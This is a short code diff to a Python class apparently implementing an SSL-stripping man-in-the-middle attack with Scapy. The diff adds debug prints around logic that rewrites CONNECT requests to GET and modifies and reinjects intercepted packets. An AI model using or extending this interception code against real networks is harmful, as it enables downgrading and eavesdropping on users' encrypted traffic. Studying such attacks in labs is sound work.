@@ -760,6 +760,7 @@ class SSLstripping(object):
 
             # Check if it's an HTTPS request
             if b"CONNECT" in raw_payload:
+                print("Connect in payload")
                 # Modify the request to target the destination HTTP server
                 modified_payload = raw_payload.replace(b"CONNECT", b"GET")
                 packet[Raw].load = modified_payload
@@ -831,18 +832,21 @@ class SSLstripping(object):
         # global initial_http
         # global sslstrip
         if TCP in packet:
-            print("got packet from {}".format(packet[Ether].src))
+            print("got packet from {}".format(packet[IP].src))
 
         if TCP in packet and Raw in packet:
             raw_payload = packet[Raw].load
 
             if b"GET" in raw_payload:
+                print("GET in payload")
                 # Step 2: Initial HTTP Connection
                 if self.initial_http:
+                    print("Modifying payload...")
                     packet = self.modify_content(packet)
                     send(packet, iface=self.SELECTED_INTERFACE)
                     self.initial_http = False
                 else:
+                    print("Sending response")
                     # Subsequent HTTP requests
                     response = sr1(packet)
 
